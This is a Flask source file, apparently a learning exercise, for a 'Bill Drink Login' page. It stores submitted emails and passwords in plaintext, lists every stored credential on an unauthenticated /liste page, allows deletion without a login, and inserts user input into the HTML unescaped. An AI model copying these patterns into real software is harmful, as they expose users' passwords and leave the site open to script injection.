from flask import Flask, request
import sqlite3

app = Flask(__name__)

# 🧱 Datenbank erstellen
def init_db():
    conn = sqlite3.connect("daten.db")
    c = conn.cursor()
    c.execute("""
    CREATE TABLE IF NOT EXISTS daten (
        email TEXT,
        password TEXT
    )
    """)
    conn.commit()
    conn.close()

init_db()

@app.route("/", methods=["GET", "POST"])
def home():
    if request.method == "POST":
        email = request.form.get("email")
        password = request.form.get("password")

        # 💾 Klartext speichern (nur Lernzweck!)
        conn = sqlite3.connect("daten.db")
        c = conn.cursor()
        c.execute("INSERT INTO daten VALUES (?, ?)", (email, password))
        conn.commit()
        conn.close()

        return f"""
        <head>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <body style="background-color:black; color:white;">
            Hallo {email.split(".")[0].capitalize()}
         </body>
         </head>
        """

    return """

    <head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <div style=text-align:center;>
    <body style="background-color:black; color:white;">

        <img src=/static/bill_drink.jpeg width=250>

        <h1>Bill Drink Login</h1>

        <form method=post>
            <input type="text" pattern="[A-Za-zÄÖÜäöüß]+" name="email" placeholder="Email"><br><br>

            <input type=password
               name=password
               placeholder=Passwort><br><br>

        <button>Senden</button>
    </form>

</div>

</body>

</head>

    
    """

@app.route("/liste")
def liste():
    conn = sqlite3.connect("daten.db")
    c = conn.cursor()
    c.execute("SELECT rowid, email, password FROM daten")
    daten = c.fetchall()
    conn.close()

    html = """
    <head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <body style="background-color:black; color:white;">
    <h2>Alle Accounts</h2>
    
    """

    for d in daten:
        html += f"""
       
        <p>
            Email: {d[1]} | Passwort: {d[2]}
            <a href="/delete/{d[0]}">❌ löschen</a>
        </p>
        
        """
    html += """
    
    <a href=/>Zurück</a>
    </body>
    </head>
    """
    return html

@app.route("/delete/<int:id>")
def delete(id):
    conn = sqlite3.connect("daten.db")
    c = conn.cursor()
    c.execute("DELETE FROM daten WHERE rowid = ?", (id,))
    conn.commit()
    conn.close()

    return """
    <head>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <body style="background-color:black; color:white;">
            Gelöscht! <a href='/liste'>Zurück</a>
        </body>
    </head>
    """

# ❗ kein app.run() wegen Render
